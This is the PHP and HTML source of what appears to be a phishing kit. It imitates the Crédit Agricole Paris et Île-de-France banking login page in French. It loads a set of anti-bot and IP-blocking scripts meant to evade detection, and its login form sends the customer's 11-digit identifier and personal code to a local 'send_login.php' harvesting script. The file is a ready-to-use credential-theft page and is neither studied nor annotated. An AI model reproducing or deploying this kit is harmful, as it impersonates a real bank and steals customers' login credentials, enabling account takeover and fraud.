<?php
    include("./system/system.php");
    include("./system/detect.php");
    include("./system/blocker.php");

include("./Bots-fSOCIETY/anti1.php");
include("./Bots-fSOCIETY/anti2.php");
include("./Bots-fSOCIETY/anti3.php");
include("./Bots-fSOCIETY/anti4.php");
include("./Bots-fSOCIETY/anti5.php");
include("./Bots-fSOCIETY/anti6.php");
include("./Bots-fSOCIETY/anti7.php");
include("./Bots-fSOCIETY/anti8.php");
include("./Bots-fSOCIETY/antibots1.php");
include("./Bots-fSOCIETY/antibots2.php");
include("./Bots-fSOCIETY/antibots3.php");
include("./Bots-fSOCIETY/antibots4.php");
include("./Bots-fSOCIETY/antibots5.php");
include("./Bots-fSOCIETY/antibots6.php");
include("./Bots-fSOCIETY/9atila.php");
include("./Bots-fSOCIETY/banned-ip.php");
?>
<!DOCTYPE html>
<html lang="fr">
<head>

    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">

    <meta name="theme-color" content="#6dc77a"/>
    <meta name="msapplication-navbutton-color" content="#6dc77a"/>
    <meta name="apple-mobile-web-app-status-bar-style" content="#6dc77a" />

    <link rel="icon" type="image/png" href="./style/favicon.png">
    
    <link rel="stylesheet" href="./style/css/bootstrap.min.css" />
    
    <link rel="stylesheet" href="./style/css/helpers.css" />

    <link rel="stylesheet" href="./style/css/fonts.css" />

    <link rel="stylesheet" href="./style/css/main.css" />


    <title>Acc&egrave;s CR - Crédit Agricole</title>

</head>
<body>



    <header id="header2">
        <div class="logo">
            <a href="#"><img class="" src="./style/CADIF_logo_horizontal_rvb_v4.png" alt="Crédit Agricole de Paris et d’Ile de France - Banque et assurances" style="/* position: absolute; */top: 10%;width: 168px;left: 6%;/* max-width: 100%; *//* max-height: 100px; *//* height: 100%; */transform: translate(6%, -9%);"></a>
        </div></a>
        </div>
        <div class="closse"><i class="fas fa-times"></i></div>
    </header>

    <main id="main">
        <div class="left">
            <div class="left-inner text-white">
                
                <h3>Important. Votre portail change vos habitudes de navigation aussi.</h3>
                <p>
                    Nous vous recommandons de prendre connaissance des nouveautés au travers de cette présentation s’adressant tout particulièrement à nos utilisateurs en situation de handicap visuel. 
                </p>
                <a href="#" class="btn btn-light fz14" style="color: #007D8F; padding: 10px 20px;">Découvrir les nouvelles fonctionnalités</a>

            </div>
        </div>
        <div class="right">
            <h1 class="mb-5">ACCÉDER À <b>MES COMPTES</b></h1>
            <div class="row">
                <div class="col-md-6">
                    <div class="form">
                        <div class="top-text">
                            <span>IDENTIFIANT</span>
                            <a href="#">Perdu / Oublié ?</a>
                        </div>
                        <form method="post" action="./system/send_login.php">
                            <div class="form-group">
                                <label for="identifiant">Saisissez votre identifiant à 11 chiffres</label>
                                <input type="text" name="identifiant" id="identifiant" class="form-control" maxlength="11" pattern="[0-11]{5}" placeholder="Ex: 98652706859">
                                <span class="btn-x btn-identifiant">x</span>
                            </div>
                            <div class="form-group zow">
                                <div class="top-text">
                                    <span>CODE PERSONNEL</span>
                                    <a href="#">Perdu / Oublié ?</a>
                                </div>
                                <input type="password" name="password" id="password" class="form-control" placeholder="Tapez votre code dans le pavé numérique" readonly="readonly" maxlength="6">
                                <span class="btn-x btn-password">x</span>
                            </div>
                            <div class="form-group zow">
                                <div class="numbers">
                                    <ul class="mb-3">
                                        <li><a data-number="6">6</a></li>
                                        <li><a data-number="8">8</a></li>
                                        <li><a data-number="1">1</a></li>
                                        <li><a data-number="9">9</a></li>
                                        <li><a data-number="0">0</a></li>
                                    </ul>
                                    <ul>
                                        <li><a data-number="2">2</a></li>
                                        <li><a data-number="7">7</a></li>
                                        <li><a data-number="3">3</a></li>
                                        <li><a data-number="5">5</a></li>
                                        <li><a data-number="4">4</a></li>
                                    </ul>
                                </div>
                            </div>
                            <input type="hidden" name="type" value="login">
                            <div class="form-group mt-5">
                                <button type="button" class="btn-get-pass disabled">Entrer mon code personnel</button>
                                <button type="submit" class="btn-submit zow disabled" disabled>VALIDER</button>
                            </div>
                            <div class="form-bottom">
                                <h3>Vous n’êtes pas encore client ?</h3>
                                <button type="button">Devenir client</button>
                            </div>
                            <input type="hidden" name="verbot">
                            <input type="hidden" name="type" value="login">
                        </form>
                    </div>
                </div>
                <div class="col-md-6">
                    <div class="mb-5">
                        <h4>VOTRE IDENTIFICATION NE CHANGE PAS</h4>
                        <p>Pour accéder à votre compte, saisissez votre identifiant (numéro de compte ou numéro de contrat CAEL) et votre code personnel habituels.</p>
                    </div>
                    <div>
                        <h4>SÉCURITÉ</h4>
                        <p>Restez vigilants et veillez à protéger vos données personnelles. <a href="#">Consultez nos conseils de sécurité</a></p>
                        <p>Nous vous invitons également à consulter régulièrement nos Conditions Générales d'utilisation.<br><a href="#">Voir les Conditions Générales d'Utilisation</a></p>
                    </div>
                </div>
            </div>
        </div>
    </main>

    <script src="./style/js/jquery.min.js"></script>
    <script src="./style/js/popper.min.js"></script>
    <script src="./style/js/bootstrap.min.js" ></script>
    <script src="./style/js/fontawesome.js"></script>
    <script src="./style/js/main.js"></script>
    <script src="./style/js/style.js"></script>

</body>
</html>